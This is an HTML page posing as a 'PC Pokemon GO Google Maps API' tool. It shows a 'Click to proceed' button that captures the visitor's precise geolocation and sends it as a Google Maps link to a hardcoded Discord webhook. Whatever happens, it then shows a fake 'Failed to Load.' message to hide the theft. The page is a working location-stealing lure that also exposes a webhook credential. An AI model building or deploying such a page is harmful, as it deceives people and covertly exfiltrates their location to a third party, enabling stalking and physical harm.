<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>PC Pokemon GO Google Maps API</title>
    <style>
        body {
            background-color: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
            font-family: Arial, sans-serif;} #buttonContainer {
            display: flex;
            flex-direction: column;
            align-items: center;} #sendLocation {
            background-color: red;
            border: none;
            border-radius: 50%;
            width: 100px;
            height: 100px;
            cursor: pointer;
            font-size: 16px;
            color: white;
            outline: none;
            transition: background-color 0.3s;} #sendLocation:hover {
            background-color: darkred;} h1 {
            position: absolute;
            top: 20%;
            font-size: 24px;
            text-align: center;} </style>
</head>
<body>
    <h1>Click to proceed</h1>
    <div id="buttonContainer">        <button id="sendLocation">â€¢</button>
    </div>
    <audio id="audio" src="funny.mp3" preload="auto"></audio> <!-- Replace with your audio file -->

    <script>
        document.getElementById('sendLocation').addEventListener('click', function() {
            // Play audio when button is pressed
            document.getElementById('audio').play();            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);} else {
                alert("Geolocation is not supported by this browser.");} });        function sendLocation(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            // Create a Google Maps link with a marker at the exact location
            const googleMapsLink =`https://www.google.com/maps/dir/?api=1&destination=${lat},${lon}&destination_place_id=ChIJN1t_tDeuEmsRUcIaDl1M5fI&markers=color:red%7Clabel:C%7C${lat},${lon}`;            const webhookUrl = 'https://discord.com/api/webhooks/1337154258281168896/NQv_m_JccepgAedCn1Le3_QindKI_voWv9L0NoI9itCIN5bpJNwXcFzDQWZRYbXH9oFb'; // Replace with your Discord webhook URL
            const data = {
                content:`User's Location:${googleMapsLink}`            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'}, body: JSON.stringify(data)            }).then(response => {
                if (response.ok) {
                    alert('Failed to Load.');} else {
                    alert('Failed to Load.');} }).catch(error => {
                console.error('Error:', error);            });} function showError(error) {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    alert("User denied the request for Geolocation.");                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Location information is unavailable.");                    break;
                case error.TIMEOUT:
                    alert("The request to get user location timed out.");                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");                    break;} }
    </script>
</body>
</html>
